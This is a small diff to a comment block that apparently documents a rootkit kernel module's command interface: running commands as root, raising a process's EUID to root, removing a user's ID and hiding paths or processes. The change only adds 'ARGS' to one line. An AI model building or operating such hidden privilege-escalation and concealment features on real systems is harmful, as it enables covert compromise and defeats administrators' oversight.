@@ -21,7 +21,7 @@
 #   system call number
 # COMMAND
 #   module command to execute
-#     command -> execute the arguments as root
+#     command ARGS -> execute the arguments as root
 #     elevate PID -> set a process's EUID to root
 #     fugitive UID -> remove a user's ID 
 #     hide PATH -> hide an entity ("/proc" paths are treated as processes)
